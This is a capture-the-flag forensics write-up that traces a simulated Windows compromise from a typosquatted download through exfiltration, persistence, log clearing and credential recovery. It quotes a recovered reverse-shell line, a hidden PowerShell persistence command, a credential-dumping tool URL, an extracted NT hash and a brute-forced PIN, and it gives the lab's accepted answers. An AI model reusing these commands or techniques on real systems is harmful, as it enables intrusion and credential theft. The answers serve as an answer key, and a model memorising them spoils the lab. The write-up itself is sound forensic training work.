## APT438 — Endpoint Forensics Lab (Challenge 59222)

## Context

Bello, a new IT team member, received a secure company PC due to the BYOD policy. While setting it up, he noticed brief recurring PowerShell pop-ups. The machine was forensically acquired and the task was to reconstruct the compromise chain from browser, registry, event log, filesystem, and credential artifacts.

The lab is hosted at `http://apt438.ctf/labs/apt438/` and consists of 21 sequential questions. Each question gates the next; correct answers reveal flags at positions 1-9.

**Resolution note:** Q10 was a hard local dead-end (deleted-RTF body unavailable in triage); teammate `[teammate]` recovered the email value externally and submitted `bigboss@mail.com`, which unlocked Q11–Q21.

## Recon

**Triage handout:** `Triage_handout.7z` (443 MB, 1019 files in 273 folders) — KAPE-style sparse triage, no raw volume image, no pagefile, no memory dump.

**Key artifact sources used:**
- Browser: `places.sqlite`, `favicons.sqlite`, `chrome_hist.db`
- Registry: `SAM`, `SYSTEM`, `SOFTWARE`, `DEFAULT`, `NTUSER.DAT` + LOG1/LOG2
- Event logs: Security, System, PowerShell Operational, Application, Defender logs
- Filesystem metadata: `$MFT` (340 MB), `$Extend\$J` (USN, 40 MB)
- Application traces: `Amcache.hve`, `SRUDB.dat`, `Windows.edb` (Search index), `ActivitiesCache.db`
- Cache: CryptnetUrlCache metadata
- Credentials: SAM/SYSTEM hives, Windows Hello Ngc container

## Exploitation (Investigation Chain)

### Initial Access

Firefox history shows a user search for an Adobe Acrobat download and a typosquatted S3 bucket, `adobe-dwonload-mirror`. The downloaded archive was `adobe.zip`; LNK and browser timestamps placed the download at `2026-04-06 03:57:59 UTC`.

The extracted malware was `C:\Users\bello\Downloads\adobe\beacon.exe`. UserAssist placed first execution at `2026-04-06 03:58:42 UTC`, Amcache identified SHA-1 `f5dfafb759ef9dce7aac23eefaf5061b14c18820`, and SRUM showed a runtime of `720002` ms plus `454360` bytes sent.

### Collection And Exfiltration

PowerShell history contained the attacker workflow: system enumeration, document search, HTTP POST exfiltration, cleanup, and log clearing. The exfiltration destination was `64.110.118.12:8080`; the sensitive file identified by the lab was `important_info.rtf`.

### Q10 Blocker (resolved by teammate)

Q10 required an email from the deleted RTF body. Triage handout does NOT include the non-resident NTFS clusters for the deleted file (file occupies LCNs 39994 and 4538938 — neither captured in triage). Teammate `[teammate]` recovered the value out-of-band: `bigboss@mail.com`.

### Persistence

Two persistence mechanisms:
1. **Run-key path:** `C:\Users\Public\Downloads\Update.bat`
2. **Scheduled task `AutoUpdate`** (GUID `{E7F3E295-66C6-4A5D-BB04-92986BDC5431}`):
   ```
   powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\Documents\Temp.ps1
   ```

Defender and filesystem artifacts showed cleanup/quarantine activity around `2026-04-06 04:09:26 UTC`. Defender detection GUID: `B85ACC36-9C0A-44C8-B5CB-1090C298715A`.

### Attacker IP (Q17)

Common candidate IPs from exfiltration and AnyDesk traces were rejected. The accepted attacker IP came from deleted reverse-shell content recovered from `$MFT`:

```text
New-Object System.Net.Sockets.TCPClient('192.168.10.129',8888)
```

### Certutil Tool Download (Q18)

`CERTUTIL.EXE-28F1E0C1.pf` showed access to a cached `SECRETSDUMP[1].PY`. The exact source URL was recovered from CryptNet URL cache metadata:

```
C:\Users\bello\AppData\LocalLow\Microsoft\CryptnetUrlCache\Metadata\E7438D6412FF2F20A1D6717D78B7D2B7
```

Accepted URL: `https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py`

### Log Clearing (Q19)

```
Security.evtx Event ID 1102: The audit log was cleared.
System.evtx Event ID 104: The System log file was cleared.
```

UTC time: `2026-04-06 04:26:59`.

### Victim NT Hash (Q20)

SAM and SYSTEM hives present under `C:\Windows\System32\config\`. Impacket offline SAM logic extracted:

```
bello:1001:aad3b435b51404eeaad3b435b51404ee:c2bdd32cd948737221eb41bf41d7a010:::
```

### Windows Hello PIN (Q21)

Windows Hello container at `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\{EE4593CE-D198-46F1-AF5C-21E69ECC1CB0}`.

Chain:
1. `ngcparse.py` → user SID `S-1-5-21-1256453946-4022582877-3363549628-1001`, software key protector `{F729BA81-46A7-4FEE-A2FD-70012EF0539C}`
2. `ngcregistrydec.py` → decrypted Ngc registry encrypted password fields
3. `ngccryptokeysdec.py` → decrypted/brute-forced the software key protector using DPAPI masterkeys
4. 4-digit PIN brute force: `[+] Found PIN : 1505`
